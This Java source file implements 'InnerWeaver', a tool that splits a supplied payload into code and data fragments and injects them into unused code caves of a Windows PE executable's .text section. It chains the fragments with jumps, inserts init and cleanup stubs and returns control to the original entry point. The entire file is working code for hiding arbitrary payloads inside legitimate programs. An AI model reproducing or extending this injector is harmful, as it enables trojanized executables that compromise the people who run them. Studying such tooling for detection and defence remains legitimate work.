package pusty.f0xdc.weaver;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;

import pusty.f0xdc.pe.ExecutableReader;
import pusty.f0xdc.location.Address;
import pusty.f0xdc.location.MemorySection;
import pusty.f0xdc.location.SectionSearcher;
import pusty.f0xdc.payload.EditablePayload;
import pusty.f0xdc.payload.InjectingEngine;
import pusty.f0xdc.payload.Payload;

//OK. This actually works but it isn't able to put stuff in the same segment
//which is pretty bad considering there are very rarely many small caves in .text
public class InnerWeaver extends Weaver{
	protected MemorySection[] sections; //Sections stuff is written to
	protected Payload[] code; //Main payload for code
	protected ArrayList<Byte[]> data; //Contains all data
	@Override
	public void run(ExecutableReader reader, Payload payload) {
		super.run(reader,  payload);
		System.out.println("[*] Inner Weaver started...");
		System.out.println("[*] Payload size: " + payload.getSize() + " Bytes");
		System.out.println("[*] Detected arch: "
				+ reader.getArch());
		System.out.println("[#] Weaver is assuming that payload has same arch");
		splitPayload(payload);
		
		System.out.println("[?] Found Data:");
		for(Byte[] d:data) {
			for(Byte b:d)
				System.out.print(Integer.toHexString(b.byteValue()&0xFF)+" ,");
			System.out.println();
		} //Debug print out found data
		System.out.println("[?] End of Data.");
		
		System.out.println("[?] Found Code:");
		for(Payload d:code) {
			for(byte b:d.getPayload())
				System.out.print(Integer.toHexString(b&0xFF)+" ,");
			System.out.println();
		} //Debug print out found data
		System.out.println("[?] End of Code.");
		
		
		Payload[] dataPayloads = setupVariableData(); //size of each payload
		int sizeOfVarTable = dataPayloads.length * 4; //amount of data entires * size of offset (4 bytes)
		//Payload end = setupCleanup(reader.getPEOptionalHeader().getAddressOfEntryPoint()+reader.getPEOptionalHeader().getImageBase()
		Payload jumpPayload = getJump();
		int jumpSize = jumpPayload.getSize();
		ArrayList<MemorySection> qList = WeaverUtil.querySortedFiltered(reader, jumpSize+1, new String[] {".text"}, SectionSearcher.MODE_RISKY);
		int size = 0;
		for(int i=0;i<qList.size();i++)
			size = size + qList.get(i).getSize();
		int real_size = size - sizeOfVarTable - code.length*jumpSize;
		System.out.println("[*] Found "+size+" free bytes in .text ("+qList.size()+" different possible caves) [~"+real_size+" Bytes usable]");		
		

		MemorySection varTable_section = searchClosest( sizeOfVarTable, "Variable Table",0);
		MemorySection init_section     = searchClosest( initSize()    , "Init Code",0);
		MemorySection clean_section     = searchClosest( cleanupSize()    , "Cleanup Code",0);
		if(varTable_section==null || init_section == null || clean_section == null) return;
		
		InjectingEngine.inject(reader, setupCleanup(),clean_section);
		InjectingEngine.filterJump(this.reader, clean_section.getSize(), clean_section, new Address(0xBBBBBBBB), new Address(reader.getOptionalHeader().getAddressOfEntryPoint()), 0);
		
		MemorySection[] dataPayload_section = new MemorySection[dataPayloads.length];
		MemorySection[] codePayload_section = new MemorySection[code.length];
		
		for(int i=0;i<dataPayloads.length;i++) {
			dataPayload_section[i]  = searchClosest(dataPayloads[i].getSize(), "Data Payload Nr. "+(i+1)+" (Size "+dataPayloads[i].getSize()+" Bytes)", 0);
			if(dataPayload_section[i]==null) return;
			InjectingEngine.inject(reader, dataPayloads[i],dataPayload_section[i]);
		}
		
		fillVarTable(reader,varTable_section, dataPayload_section);
		
		for(int i=0;i<code.length;i++) { //reserve necessary memory
			codePayload_section[i]  = searchClosest(code[i].getSize()+jumpSize, "Code Payload Nr. "+(i+1)+" (Size "+(code[i].getSize()+jumpSize)+" Bytes)", jumpSize);
			if(codePayload_section[i]==null) return;
			if(i>0) {
				InjectingEngine.fill(this.reader, codePayload_section[i-1], (byte)0xDE, code[i].getSize(), jumpSize);
			}
		}
		for(int i=0;i<code.length;i++) { //fill memory
			InjectingEngine.inject(reader, code[i],codePayload_section[i]);
			EditablePayload tmp = EditablePayload.clone(jumpPayload);
			Address addr = null;
			if(i > 0) { //Skip first segment
				addr = codePayload_section[i].getAddress(reader);		
				boolean overlap = false;
				for(int a=0;a<code.length;a++) {  //Check if memory is overlapping, if yes: don't place a jump
					if(a==i-1) continue;
					if(codePayload_section[i-1].getOffsetFrom() >= codePayload_section[a].getOffsetTo() && codePayload_section[i-1].getOffsetTo() < codePayload_section[a].getOffsetTo()) {
						overlap = true;
						break;
					}
				}
				if(!overlap)
				InjectingEngine.filterJump(reader, codePayload_section[i-1].getSize(),codePayload_section[i-1],new Address(0xAAAAAAAA),addr,code[i-1].getSize() );
			}
			InjectingEngine.inject(reader, tmp,codePayload_section[i],code[i].getSize());
			if(i == code.length-1) {
				addr = clean_section.getAddress(reader);
				InjectingEngine.filterJump(reader, codePayload_section[i].getSize(),codePayload_section[i],new Address(0xAAAAAAAA),addr,code[i].getSize() );
			}
		}
		//System.out.println(codePayload_section[0].getAddress(reader).getAddr32());
		InjectingEngine.inject(reader,setupInit(),init_section);
		InjectingEngine.filterJump(this.reader, init_section.getSize(), init_section, new Address(0xAAAAAAAA), codePayload_section[0].getAddress(reader), 0);
		InjectingEngine.filterJump(this.reader, init_section.getSize(), init_section, new Address(0xBBBBBBBB), varTable_section.getAddress(reader), 0);
	
		InjectingEngine.update(reader, 0, init_section, false);
		System.out.println("[*] Enough space for everything found!");
		sections = codePayload_section;
		InjectingEngine.fixBorders(reader, init_section); //Fixes Virtual Size if outside of it
		
	}
	
	private MemorySection searchClosest(int size, String name, int jumpSize) {
		ArrayList<MemorySection> qList = WeaverUtil.querySortedFiltered(reader, size, new String[] {".text"}, SectionSearcher.MODE_RISKY);
		int index = WeaverUtil.closestToSize(qList, size, null);
		if(index == -1) {
			System.out.println("[!] No place found for "+name);
			return null;
		}
		MemorySection section = qList.get(index);
		//qList.remove(index);
		section.setSize(size);
		InjectingEngine.fill(this.reader, section, (byte)0xDE, 0, size-jumpSize);
		return section;
	}
	
	//Create Payloads for data
	private Payload[] setupVariableData() {
		if(data.size() == 0) return null;
		Payload[] dataloads = new Payload[data.size()];
		for(int i=0;i<data.size();i++) {
			byte[] t = new byte[data.get(i).length];
			for(int b=0;b<data.get(i).length;b++)
				t[b] = data.get(i)[b];
			dataloads[i] = EditablePayload.fromBytes(t);
		}
		return dataloads;
	}
	
	public void fillVarTable(ExecutableReader reader,MemorySection varTable, MemorySection[] dataPayloads) {
		try {
			for(int i=0;i<dataPayloads.length;i++) {
				if(!reader.is32bit())
					reader.getStream().setInt(varTable.getOffsetFrom()+i*4, (int)(dataPayloads[i].getAddressFrom()-varTable.getAddressFrom()));
				else
					reader.getStream().setInt(varTable.getOffsetFrom()+i*4, dataPayloads[i].getAddressFrom()-varTable.getAddressFrom());
			}
		}catch(Exception e) {
			e.printStackTrace();
		}
	}
	
	private void splitPayload(Payload raw) {
		EditablePayload editable = EditablePayload.fromBytes(raw.getPayload());
		EditablePayload code = null;
		ArrayList<Byte[]> data = new ArrayList<Byte[]>();
		int offset = 4;
		int dataStart = editable.findInt(0xDEADDA7A)+offset; //Start of data
		if(dataStart != (-1+4)) {
			code = EditablePayload.fromBytes(Arrays.copyOfRange(editable.getPayload(),0,dataStart-offset));
			ArrayList<Byte> byteList = new ArrayList<Byte>();
			int endOfData = editable.findByte((byte)0x90, dataStart, editable.getPayload().length); //Find NOPs
			do {
				if(endOfData == -1)
					endOfData = editable.getSize();
				for(int i=dataStart;i<endOfData;i++)
					byteList.add(editable.getByte(i));
				dataStart = endOfData+1;
				data.add(byteList.toArray(new Byte[byteList.size()])); //add extracted data to data array
				byteList.clear();
				if(dataStart >= editable.getSize()) break;
				endOfData = editable.findByte((byte)0x90, dataStart, editable.getPayload().length); // seperate data with NOPs
			}while(true);
			
		}else {
			code = editable;
		}
		//Now split the code:
		this.data = data;
		{
			ArrayList<Byte[]> codeData = new ArrayList<Byte[]>();
			dataStart = 0;
			ArrayList<Byte> byteList = new ArrayList<Byte>();
			int endOfData = editable.findByte((byte)0x90, dataStart, code.getPayload().length); //Find NOPs
			do {
				if(endOfData == -1)
					endOfData = code.getSize();
				for(int i=dataStart;i<endOfData;i++)
					byteList.add(code.getByte(i));
				dataStart = endOfData+1;
				codeData.add(byteList.toArray(new Byte[byteList.size()])); //add extracted data to data array
				byteList.clear();
				if(dataStart >= code.getSize()) break;
				endOfData = code.findByte((byte)0x90, dataStart, code.getPayload().length); // seperate data with NOPs
			}while(true);
			
			Payload[] codePayloads = new Payload[codeData.size()];
			for(int i=0;i<codeData.size();i++) {
				byte[] t = new byte[codeData.get(i).length];
				for(int b=0;b<codeData.get(i).length;b++)
					t[b] = codeData.get(i)[b];
				codePayloads[i] = EditablePayload.fromBytes(t);
			}
			this.code = codePayloads;		
		}
		
		// code = code payload
		// data = arraylist of Byte[] containing different data parts
	}
	private int initSize() {
		return EditablePayload.fromFile(new File("payload\\inner_weaver\\inner_init"+reader.getArch())).getSize();
	}
	private Payload getJump() {
		return EditablePayload.fromFile(new File("payload\\inner_weaver\\inner_jump"+reader.getArch()));
	}

	private Payload setupInit() {
		EditablePayload inner_init = EditablePayload.fromFile(new File("payload\\inner_weaver\\inner_init"+reader.getArch()));
		if(inner_init == null) {
			System.out.println("[!] Error didn't find Inner_Init File");
			return null;
		}
		return inner_init;
	}
	private int cleanupSize() {
		return EditablePayload.fromFile(new File("payload\\inner_weaver\\inner_stop"+reader.getArch())).getSize();
	}
	private Payload setupCleanup() {
		EditablePayload inner_stop = EditablePayload.fromFile(new File("payload\\inner_weaver\\inner_stop"+reader.getArch()));
		if(inner_stop == null) {
			System.out.println("[!] Error didn't find Inner_Stop File");
			return null;
		}
		return inner_stop;
	}
	
	
	
	public MemorySection[] getSections() {
		return sections;
	}

	public static InnerWeaver runFromFiles(File peFile, File payload) {
		InnerWeaver simpleWeaver = new InnerWeaver();
		try {
			ExecutableReader reader = ExecutableReader.create(peFile);
			simpleWeaver.run(reader, EditablePayload.fromFile(payload));
		} catch (Exception e) {
			e.printStackTrace();
		}
		return simpleWeaver;
	}
}
